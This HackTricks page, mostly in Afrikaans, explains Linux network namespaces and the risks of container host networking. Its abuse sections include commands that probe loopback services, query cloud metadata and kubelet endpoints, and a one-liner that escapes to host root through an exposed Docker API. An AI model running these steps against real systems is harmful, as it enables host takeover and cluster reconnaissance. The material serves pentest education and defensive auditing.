# Netwerk-namespace

{{#include ../../../../../banners/hacktricks-training.md}}

## Oorsig

Die netwerk-namespace isoleer netwerkverwante hulpbronne soos interfaces, IP-adresse, roetetabelle, ARP/buurtoestand, firewall-reëls, sockets, en die inhoud van lêers soos `/proc/net`. Dit is hoekom 'n container skynbaar sy eie `eth0`, eie plaaslike roetes, en sy eie loopback-toestel kan hê sonder om die host se werklike netwerkstapel te besit.

Veiligheidgewys is dit belangrik omdat netwerkisolering baie meer is as net poortbinding. 'n Private netwerk-namespace beperk wat die workload direk kan bespeur of herkonfigureer. Sodra daardie namespace met die host gedeel word, kan die container skielik sig kry op host listeners, host-lokale dienste en netwerkbeheerpunte wat nooit aan die toepassing blootgestel moes word nie.

## Werking

'n Nuut geskepte netwerk-namespace begin met 'n leë of byna leë netwerk-omgewing totdat interfaces daaraan aangeheg word. Container runtimes skep of koppel dan virtuele interfaces, ken adresse toe, en configureer roetes sodat die workload die verwagte konnektiwiteit het. In bridge-based implementasies beteken dit gewoonlik dat die container 'n veth-backed interface sien wat aan 'n host bridge gekoppel is. In Kubernetes hanteer CNI plugins die ekwivalente opstelling vir Pod networking.

Hierdie argitektuur verduidelik waarom `--network=host` of `hostNetwork: true` so 'n dramatiese verandering is. In plaas daarvan om 'n voorbereide private netwerkstapel te ontvang, sluit die workload by die host se werklike een aan.

## Lab

Jy kan 'n byna leë netwerk-namespace sien met:
```bash
sudo unshare --net --fork bash
ip addr
ip route
```
En jy kan normale en host-networked containers vergelyk met:
```bash
docker run --rm debian:stable-slim sh -c 'ip addr || ifconfig'
docker run --rm --network=host debian:stable-slim sh -c 'ss -lntp | head'
```
Die host-networked container no longer has its own isolated socket and interface view. That change alone is already significant before you even ask what capabilities the process has.

## Tydens uitvoering

Docker en Podman skep gewoonlik 'n privaat netwerk-namespace vir elke container, tensy anders gekonfigureer. Kubernetes gee gewoonlik elke Pod sy eie netwerk-namespace, gedeel deur die containers binne daardie Pod maar apart van die host. Incus/LXC-stelsels bied ook ryk netwerk-namespace-gebaseerde isolasie, dikwels met 'n wyer verskeidenheid virtuele netwerkopstellings.

Die algemene beginsel is dat privaat netwerking die standaard isolasiegrens is, terwyl host networking 'n eksplisiete opt-out van daardie grens is.

## Miskonfigurasies

Die belangrikste miskonfigurasie is eenvoudig die deel van die host netwerk-namespace. Dit word soms gedoen vir prestasie, laevlak monitoring, of gerief, maar dit verwyder een van die suiwerste grense wat aan containers beskikbaar is. Host-local luisteraars word op 'n meer direkte manier bereikbaar, localhost-only dienste kan toeganklik raak, en vermoëns soos `CAP_NET_ADMIN` of `CAP_NET_RAW` word baie gevaarliker omdat die bewerkings wat hulle moontlik maak nou op die host se eie netwerk-omgewing toegepas word.

Nog 'n probleem is om netwerkverwante capabilities te veel te gee, selfs wanneer die netwerk-namespace privaat is. 'n Privaat namespace help wel, maar dit maak raw sockets of gevorderde netwerkbeheer nie onskadelik nie.

## Misbruik

In swak geïsoleerde opstellings kan aanvallers die host se luisterdienste inspekteer, bestuur-endpunte bereik wat slegs aan loopback gebind is, verkeer sniff of daarmee inmeng afhangend van die presiese capabilities en omgewing, of die routerings- en firewalltoestand herkonfigureer as `CAP_NET_ADMIN` teenwoordig is. In 'n cluster kan dit ook laterale beweging en control-plane verkenning vergemaklik.

As jy vermoed dat host networking gebruik word, begin deur te bevestig dat die sigbare interfaces en luisteraars aan die host behoort eerder as aan 'n geïsoleerde container-netwerk:
```bash
ip addr
ip route
ss -lntup | head -n 50
```
Dienste wat slegs op die loopback beskikbaar is, is dikwels die eerste interessante ontdekking:
```bash
ss -lntp | grep '127.0.0.1'
curl -s http://127.0.0.1:2375/version 2>/dev/null
curl -sk https://127.0.0.1:2376/version 2>/dev/null
```
As netwerkvermoëns teenwoordig is, toets of die workload die sigbare stack kan inspekteer of verander:
```bash
capsh --print | grep -E 'cap_net_admin|cap_net_raw'
iptables -S 2>/dev/null || nft list ruleset 2>/dev/null
ip link show
```
In cluster- of cloud-omgewings maak host networking ook 'n vinnige plaaslike recon van metadata en control-plane-adjacent services sinvol:
```bash
for u in \
http://169.254.169.254/latest/meta-data/ \
http://100.100.100.200/latest/meta-data/ \
http://127.0.0.1:10250/pods; do
curl -m 2 -s "$u" 2>/dev/null | head
done
```
### Volledige voorbeeld: Host Networking + Local Runtime / Kubelet Access

Host networking verskaf nie outomaties host root nie, maar dit openbaar dikwels dienste wat doelbewus slegs vanaf die node self bereikbaar is. As een van daardie dienste swak beskerm is, word host networking 'n direkte privilege-escalation-pad.

Docker API on localhost:
```bash
curl -s http://127.0.0.1:2375/version 2>/dev/null
docker -H tcp://127.0.0.1:2375 run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
```
Kubelet op localhost:
```bash
curl -k https://127.0.0.1:10250/pods 2>/dev/null | head
curl -k https://127.0.0.1:10250/runningpods/ 2>/dev/null | head
```
Impak:

- direkte gasheerkompromittering indien 'n plaaslike runtime-API blootgestel word sonder behoorlike beskerming
- clusterverkenning of laterale beweging as kubelet of plaaslike agente bereikbaar is
- verkeer-manipulasie of diensweiering wanneer dit gekombineer word met `CAP_NET_ADMIN`

## Checks

Die doel van hierdie kontroles is om te bepaal of die proses 'n private netwerkstapel het, watter roetes en luisteraars sigbaar is, en of die netwerk-uitsig reeds gasheeragtig lyk voordat jy selfs capabilities toets.
```bash
readlink /proc/self/ns/net   # Network namespace identifier
ip addr                      # Visible interfaces and addresses
ip route                     # Routing table
ss -lntup                    # Listening TCP/UDP sockets with process info
```
Wat is interessant hier:

- Indien die namespace identifier of die sigbare interface-set soos die host lyk, mag host networking reeds in gebruik wees.
- `ss -lntup` is veral waardevol omdat dit loopback-only listeners en local management endpoints onthul.
- Routes, interface names, and firewall context word veel belangriker as `CAP_NET_ADMIN` of `CAP_NET_RAW` teenwoordig is.

Wanneer 'n container nagegaan word, evalueer altyd die network namespace saam met die capability set. Host networking plus sterk network capabilities is 'n baie ander houding as bridge networking plus 'n noue standaard capability set.
{{#include ../../../../../banners/hacktricks-training.md}}
